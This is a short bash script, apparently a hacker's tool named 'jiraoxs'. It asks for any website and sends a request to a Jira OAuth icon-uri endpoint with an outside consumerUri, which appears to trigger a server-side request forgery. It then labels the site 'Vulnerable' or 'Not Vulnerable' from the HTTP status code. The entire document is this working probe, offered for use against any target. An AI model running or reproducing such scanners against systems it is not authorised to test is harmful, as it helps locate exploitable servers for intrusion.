#!/bin/bash
#ByB2G

RED=`echo -e '\033[31m'`
GREEN=`echo -e '\033[0;32m'`
figlet jiraoxs | lolcat
linkto="plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com"
read -p "Enter Website to Found: " www
cr=`curl -LI $www/$linkto -o /dev/null -w '%{http_code}\n' -s`
if [ $cr -eq 200 ]
then
echo "$GREEN Vulnerable Website"
else
echo "$RED Not Vulnerable Website"
fi
